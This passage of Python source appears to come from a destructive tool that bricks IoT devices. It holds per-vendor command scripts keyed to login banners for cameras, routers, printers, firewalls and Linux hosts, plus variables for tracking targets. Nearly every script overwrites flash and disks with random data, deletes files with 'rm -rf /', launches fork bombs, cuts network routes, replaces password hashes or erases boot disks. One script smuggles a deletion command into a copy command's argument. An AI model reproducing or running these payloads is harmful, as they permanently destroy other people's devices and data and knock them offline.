              'admin@TVR',
              'su root',
              '[#$>] ',
              'df',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/hda1 &',
              '',
              'dd if=/dev/urandom of=/dev/hdb1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '',
              'route del default;dd if=/dev/urandom of=/dev/ram0 &',
              '[#$>] ',
              'rm -rf /mtd0/* &',
              '%WAIT%',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['avc',
              '.*',
              'APPCOM:',
              'shell',
              '[#$>] ',
              'df',
              '[#$>] ',
              'cat /dev/urandom >/dev/hda &',
              '',
              'cat /dev/urandom >/dev/hda1 &',
              '',
              'cat /dev/urandom >/dev/hda2 &',
              '',
              'cat /dev/urandom >/dev/hda3 &',
              '',
              'cat /dev/urandom >/dev/hda4 &',
              '',
              'route del default;rm -rf / 2>/dev/null &',
              '%WAIT%',
              'd() { d | d & }; d 2>/dev/null',
              '%TERM%',
              ],
             ['hikvision',
              'root/.*',
              'hikvision',
              'su root',
              'Password: ',
              '%OLDPASS%',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/sda &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/sdb &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtd2 &',
              '%WAIT%',
              'dd if=/dev/urandom of=/dev/root &',
              '[#$>] ',
              'route del default;dd if=/dev/urandom of=/dev/ram0 &',
              '%WAIT%',
              ],
             ['hikvision',
              'root/hikvision',
              '.*',
              'su root',
              'Password: ',
              '%OLDPASS%',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/sda &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/sdb &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtd2 &',
              '%WAIT%',
              'dd if=/dev/urandom of=/dev/root &',
              '[#$>] ',
              'route del default;dd if=/dev/urandom of=/dev/ram0 &',
              '%WAIT%',
              ],
             ['hikvision',
              '.*',
              'hikvision',
              'echo HAKVISION >/home/hik/hicore.tar.gz',
              '[#$>] ',
              'echo HAKVISION >/home/hik/uImage',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock0 >/home/hik/start.sh',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock1 >>/home/hik/start.sh',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock2 >>/home/hik/start.sh',
              '[#$>] ',
              'echo reboot >>/home/hik/start.sh',
              '[#$>] ',
              'echo HAKVISION >/home/hik/webs.tar.gz',
              '[#$>] ',
              'echo HAKVISION >/home/hik/hicore.tar.lzma',
              '[#$>] ',
              'echo root:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >/etc/shadow',
              '[#$>] ',
              'echo hikvision:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >>/etc/shadow',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/%NEWPASS% >>/%NEWPASS%2',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/home/app/%NEWPASS% >>/home/app/%NEWPASS%2',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/tmp/%NEWPASS% >>/tmp/%NEWPASS%2',
              '[#$>] ',
              'while[1 ]; do cat /%NEWPASS% >>/%NEWPASS%3; cat /%NEWPASS%2 >>/%NEWPASS%3 done &',
              '[#$>] ',
              ],
             ['hikvision',
              'hikvision/.*',
              '.*',
              'echo HAKVISION >/home/hik/hicore.tar.gz',
              '[#$>] ',
              'echo HAKVISION >/home/hik/uImage',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock0 >/home/hik/start.sh',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock1 >>/home/hik/start.sh',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock2 >>/home/hik/start.sh',
              '[#$>] ',
              'echo reboot >>/home/hik/start.sh',
              '[#$>] ',
              'echo HAKVISION >/home/hik/webs.tar.gz',
              '[#$>] ',
              'echo HAKVISION >/home/hik/hicore.tar.lzma',
              '[#$>] ',
              'echo root:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >/etc/shadow',
              '[#$>] ',
              'echo hikvision:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >>/etc/shadow',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/%NEWPASS% >>/%NEWPASS%2',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/home/app/%NEWPASS% >>/home/app/%NEWPASS%2',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/tmp/%NEWPASS% >>/tmp/%NEWPASS%2',
              '[#$>] ',
              'while[1 ]; do cat /%NEWPASS% >>/%NEWPASS%3; '
              'cat /%NEWPASS%2 >>/%NEWPASS%3 done &',
              '[#$>] ',
              '%RELAUNCH2%',
              '%RELAUNCH2%',
              ],
             ['hikvision',
              'guest/.*',
              'dvrdvs',
              'echo HAKVISION >/home/hik/hicore.tar.gz',
              '[#$>] ',
              'echo HAKVISION >/home/hik/uImage',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock0 >/home/hik/start.sh',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock1 >>/home/hik/start.sh',
              '[#$>] ',
              'echo dd if=/dev/urandom of=/dev/mtdblock2 >>/home/hik/start.sh',
              '[#$>] ',
              'echo reboot >>/home/hik/start.sh',
              '[#$>] ',
              'echo HAKVISION >/home/hik/webs.tar.gz',
              '[#$>] ',
              'echo HAKVISION >/home/hik/hicore.tar.lzma',
              '[#$>] ',
              'echo root:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >/etc/shadow',
              '[#$>] ',
              'echo hikvision:\$1\$ChRPh3ur\$Yy6bjTErRXoajEZ1jao79/:14194:0:99999:7::: >>/etc/shadow',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/%NEWPASS% >>/%NEWPASS%2',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/home/app/%NEWPASS% >>/home/app/%NEWPASS%2',
              '[#$>] ',
              'd() { echo xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; d|d & };d 2>>/tmp/%NEWPASS% >>/tmp/%NEWPASS%2',
              '[#$>] ',
              'while[1 ]; do cat /%NEWPASS% >>/%NEWPASS%3; '
              'cat /%NEWPASS%2 >>/%NEWPASS%3 done &',
              '[#$>] ',
              ],
             ['slave',
              '.*',
              'Invalid command!',
              'enable',
              'assword: ',
              '%OLDPASS%',
              '[#$>] ',
              'enable',
              '[#$>:] ',
              'admin',
              '[#$>:] ',
              'system',
              '[#$>] ',
              'sh',
              '[#$>] ',
              'df',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/mtdblock0;'
              'dd if=/dev/urandom of=/dev/mtdblock1;'
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '[#$>] ',
              'route del default;iptables -A INPUT -j DROP',
              '%TERM%',
              ],
             ['zhone',
              'admin/zhone',
              '',
              'enable',
              '[#$>] ',
              'development',
              '[#$>] ',
              'sh',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'cat /etc/passwd',
              '',
              'passwd',
              'New password: ',
              '%NEWPASS%',
              'Retype password: " ',
              '%NEWPASS%',
              '[#$>] ',
              'passwd admin',
              'New password: ',
              '%NEWPASS%',
              'Retype password: " ',
              '%NEWPASS%',
              '[#$>] ',
              'passwd user',
              'New password: ',
              '%NEWPASS%',
              'Retype password: " ',
              '%NEWPASS%',
              '[#$>] ',
              'passwd manufacturing',
              'New password: ',
              '%NEWPASS%',
              'Retype password: " ',
              '%NEWPASS%',
              '[#$>] ',
              'passwd nobody',
              'New password: ',
              '%NEWPASS%',
              'Retype password: " ',
              '%NEWPASS%',
              '[#$>] ',
              'route del default',
              '[#$>] ',
              'iptables -A OUTPUT -j DROP',
              '[#$>] ',
              'set2default',
              ': ',
              'yes',
              ': ',
              'yes',
              'yes\S ',
              'no',
              'no\S ',
              'yes',
              'accordingly',
              ],
             ['vxworks',
              '.*',
              '(tStdioProxy|IrqDLCS_?CMD_PROCESSOR|'
              'ipcom_?telnetspawn|tErfTask|\sstkCommand\s|OnLine help \S press F1)',
              'td tExcTask;td tJobTask',
              '-> ',
              'td TR069C;td TR069S;td TR069_chk',
              '-> ',
              'td iptftps',
              '-> ',
              'td ipdhcpc',
              '-> ',
              'td ipdhcps',
              '-> ',
              'td ipcom_telnetd',
              '-> ',
              'td ipnetd',
              '-> ',
              ],
             ['view',
              '.*',
              'type \'sh\', exc[e]?ute shell',
              '?',
              '[#$>] ',
              'sh',
              '[#$>] ',
              'cat /proc/mounts',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock11 &',
              '',
              'cat /dev/urandom >/dev/mtdblock10 &',
              '',
              'cat /dev/urandom >/dev/mtdblock12 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'route del default',
              '%WAIT%',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT% ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['bocrouter',
              '.*',
              '(BoC Router|Unknow command)',
              'runshellcmd',
              '>',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '>',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '>',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '>',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '>',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '>',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '>',
              'route del default',
              '>',
              ],
             ['atmos',
              '.*',
              'Unrecognized command \Suse \S\?\S to see valid completions',
              'console enable',
              '> ',
              'flashfs',
              '> ',
              'wipe',
              '> ',
              'home',
              '> ',
              'restart',
              '',
              ],
             ['sixpon',
              '.*',
              'Enter lazy mode, input \S+ to back, input \S+ to quit',
              '/',
              '[#$>] ',
              'linuxshell',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '[#$>] ',
              'route del default',
              '[#$>] ',
              'iptables -F;iptables -t nat -F;iptables -A INPUT -j DROP',
              '[#$>] ',
              ],
             ['fortigate',
              '.*',
              'Unknown action 0',
              'execute erase-disk boot',
              'y/n\) ',
              'y',
              'media\? ',
              '1',
              'y/n\) ',
              'n',
              '%WAIT%',
              'execute shutdown',
              'y/n\) ',
              'y',
              '%TERM%',
              ],
             ['cellbug',
              '.*',
              '% Unknown command,\s+\[\%s',
              'enable',
              '[#$>] ',
              'configure terminal',
              '[#$>] ',
              'wlanoff',
              '[#$>] ',
              'save',
              '[#$>] ',
              'configure terminal',
              '[#$>] ',
              'cdma-disconnect\nsave',
              '[#$>] ',
              ],
             ['quagga',
              '.*',
              '% Unknown command\.',
              '?',
              '[#$>] ',
              'enable',
              '[#$>] ',
              'start-shell',
              '[#$>] ',
              'start-shell bash',
              '[#$>] ',
              'fdisk -l',
              '[#$>] ',
              "fdisk -C 1 /dev/mtd0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtd1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtd2",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtd3",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtd4",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtdblock0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtdblock1",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtdblock2",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtdblock3",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/mtdblock4",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              "fdisk -C 1 /dev/ram0",
              'm\sfor\shelp\S?: ',
              "w",
              '[#$>] ',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '[#$>] ',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '[#$>] ',
              'copy flash `rm${IFS}-rf${IFS}/*${IFS}&` tftp 1.2.3.4',
              '',
              'copy flash `route${IFS}del${IFS}default` tftp 1.2.3.4',
              '[#$>] ',
              'configure terminal',
              '[#$>] ',
              'username %OLDUSER% %NEWPASS%',
              '[#$>] ',
              'user administrator admin disable',
              '[#$>] ',
              'restore factory_setting',
              '[#$>] ',
              'restore factory_defaults',
              '[#$>] ',
              'exit',
              '[#$>] ',
              ],
             ["qtech",
              ".*",
              '>\s+restoredefault\s+restore the device settings to the factory defaults and reboot',
              'model',
              '[#$>] ',
              'arp',
              '[#$>] ',
              'restoredefault',
              '%WAIT%',
              ],
             ['ricoh',
              '.*',
              'msh> ',
              'devicename name HACKED',
              'msh> ',
              'ifconfig',
              'msh> ',
              'ifconfig ether 10.1.2.3',
              'msh> ',
              'ifconfig ether netmask 255.255.255.254',
              'msh> ',
              'route add default 10.1.2.2',
              'msh> ',
              'dhcp ether off',
              'msh> ',
              'hostname ether name PRINTER-HACKED',
              'msh> ',
              'logout',
              '> ',
              'yes',
              'Save',
              ],
             ["busybox",
              "root/5up",
              'BusyBox\sv',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '%WAIT%',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '[#$] ',
              "reboot",
              '[#$] ',
              ],
             ["busybox",
              "root/BUSYBOXBLANK",
              '',
              'mtd_write erase mtd0 &',
              '',
              'mtd_write erase mtd1 &',
              '',
              'mtd_write erase mtd2',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '',
              'cat /dev/urandom >/dev/mtdblock9 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '%WAIT%',
              "sysctl -w net.ipv4.tcp_timestamps=0",
              '[#$] ',
              "sysctl -w kernel.threads-max=1",
              '%WAIT%',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['reosguest',
              'guest/.*',
              'ReOS.*UTT',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ["busybox",
              ".*",
              'BusyBox\sv',
              'mtd_write erase mtd0 &',
              '',
              'mtd_write erase mtd1 &',
              '',
              'mtd_write erase mtd2',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'cat /dev/urandom >/dev/mtdblock16 &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '%WAIT%',
              "sysctl -w net.ipv4.tcp_timestamps=0",
              '[#$] ',
              "sysctl -w kernel.threads-max=1",
              '%WAIT%',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ["busybox",
              ".*",
              'ls:\sillegal\soption\s\-\-\sF',
              'mtd_write erase mtd0 &',
              '',
              'mtd_write erase mtd1 &',
              '',
              'mtd_write erase mtd2',
              '',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/mtdblock8 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'cat /dev/urandom >/dev/mtdblock16 &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '%WAIT%',
              "sysctl -w net.ipv4.tcp_timestamps=0",
              '[#$] ',
              "sysctl -w kernel.threads-max=1",
              '%WAIT%',
              "halt -n -f",
              '[#$] ',
              "reboot",
              '[#$] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ['misid',
              ".*",
              'SYSTEM.HACKED.PLEASE.REINSTALL',
              'su root',
              '[#$>] ',
	          'uptime',
              '',
              'cat /etc/motd',
              '',
              'fdisk -l',
              '',
              'df',
              '',
              'dd if=/dev/urandom of=/dev/sda &',
              '',
              'dd if=/dev/urandom of=/dev/sda1 &',
              '',
              'dd if=/dev/urandom of=/dev/sda2 &',
              '',
              'dd if=/dev/urandom of=/dev/sda3 &',
              '',
              'dd if=/dev/urandom of=/dev/sda4 &',
              '',
              'dd if=/dev/urandom of=/dev/sdb &',
              '',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd3 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock5 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock6 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock7 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/hda1 &',
              '',
              'dd if=/dev/urandom of=/dev/hdb1 &',
              '',
              'dd if=/dev/urandom of=/dev/root &',
              '',
              'dd if=/dev/urandom of=/dev/ram0 &',
              '',
              'dd if=/dev/urandom of=/dev/mmcblk0 &',
              '',
              'dd if=/dev/urandom of=/dev/mmcblk0p1 &',
              '',
              'cat /dev/urandom >/dev/sda &',
              '',
              'cat /dev/urandom >/dev/sda1 &',
              '',
              'cat /dev/urandom >/dev/sda2 &',
              '',
              'cat /dev/urandom >/dev/sda3 &',
              '',
              'cat /dev/urandom >/dev/sda4 &',
              '',
              'cat /dev/urandom >/dev/sdb &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/hda1 &',
              '',
              'cat /dev/urandom >/dev/hdb1 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'cat /dev/urandom >/dev/ram0 &',
              '',
              'cat /dev/urandom >/dev/mmcblk0 &',
              '',
              'cat /dev/urandom >/dev/mmcblk0p1 &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT% ',
              'd(){ d|d & };d 2>/dev/null',
              '[#$>] ',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '%WAIT% ',
              'halt -n -f',
              '[#$>] ',
              'reboot',
              '[#$>] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ["linux",
              ".*",
              '(Linux\s\S+\s\d\.\d|hAjUCNM1)',
              'su root',
              '[#$>] ',
              'uptime',
              '',
              'cat /etc/motd',
              '',
              'fdisk -l',
              '',
              'df',
              '',
              'dd if=/dev/urandom of=/dev/sda &',
              '',
              'dd if=/dev/urandom of=/dev/sda1 &',
              '',
              'dd if=/dev/urandom of=/dev/sda2 &',
              '',
              'dd if=/dev/urandom of=/dev/sda3 &',
              '',
              'dd if=/dev/urandom of=/dev/sda4 &',
              '',
              'dd if=/dev/urandom of=/dev/sdb &',
              '',
              'dd if=/dev/urandom of=/dev/mtd0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtd3 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock0 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock1 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock2 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock3 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock4 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock5 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock6 &',
              '',
              'dd if=/dev/urandom of=/dev/mtdblock7 &',
              '[#$>] ',
              'dd if=/dev/urandom of=/dev/hda1 &',
              '',
              'dd if=/dev/urandom of=/dev/hdb1 &',
              '',
              'dd if=/dev/urandom of=/dev/root &',
              '',
              'dd if=/dev/urandom of=/dev/ram0 &',
              '',
              'dd if=/dev/urandom of=/dev/mmcblk0 &',
              '',
              'dd if=/dev/urandom of=/dev/mmcblk0p1 &',
              '',
              'cat /dev/urandom >/dev/sda &',
              '',
              'cat /dev/urandom >/dev/sda1 &',
              '',
              'cat /dev/urandom >/dev/sda2 &',
              '',
              'cat /dev/urandom >/dev/sda3 &',
              '',
              'cat /dev/urandom >/dev/sda4 &',
              '',
              'cat /dev/urandom >/dev/sdb &',
              '',
              'cat /dev/urandom >/dev/mtd0 &',
              '',
              'cat /dev/urandom >/dev/mtd1 &',
              '',
              'cat /dev/urandom >/dev/mtd2 &',
              '',
              'cat /dev/urandom >/dev/mtd3 &',
              '[#$>] ',
              'cat /dev/urandom >/dev/mtdblock0 &',
              '',
              'cat /dev/urandom >/dev/mtdblock1 &',
              '',
              'cat /dev/urandom >/dev/mtdblock2 &',
              '',
              'cat /dev/urandom >/dev/mtdblock3 &',
              '',
              'cat /dev/urandom >/dev/mtdblock4 &',
              '',
              'cat /dev/urandom >/dev/mtdblock5 &',
              '',
              'cat /dev/urandom >/dev/mtdblock6 &',
              '',
              'cat /dev/urandom >/dev/mtdblock7 &',
              '',
              'cat /dev/urandom >/dev/hda1 &',
              '',
              'cat /dev/urandom >/dev/hdb1 &',
              '',
              'cat /dev/urandom >/dev/root &',
              '',
              'cat /dev/urandom >/dev/ram0 &',
              '',
              'cat /dev/urandom >/dev/mmcblk0 &',
              '',
              'cat /dev/urandom >/dev/mmcblk0p1 &',
              '',
              'route del default;iproute del default;rm -rf /* 2>/dev/null &',
              '',
              'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP',
              '%WAIT% ',
              'd(){ d|d & };d 2>/dev/null',
              '[#$>] ',
              'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1',
              '%WAIT% ',
              'halt -n -f',
              '[#$>] ',
              'reboot',
              '[#$>] ',
              'd(){ d|d & };d',
              '%TERM%',
              ],
             ["telnet",
              ".*",
              ".*",
              "cat /etc/shadow",
              '[#$>] ',
            ]
        ]

O0O = "SPLTX"  # Not visibly used in this code.

# List of socket.socket() of previous targets. NOTE: targets, not previous
targeted_sock = []

# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values are (targetip, int(targetport), bannerhint) of the target.
targeted_targets = {}

# Dictionary of previous targets. Keys are hash(socket.socket()) of the
# target, values are hash(hash(socket.socket()).
targeted_masterhash = {}

# Dictionary of previous targets. Keys are hash(socket.socket()) of the target,
# values are banner headers retrieved from target.
targeted_banner1 = {}
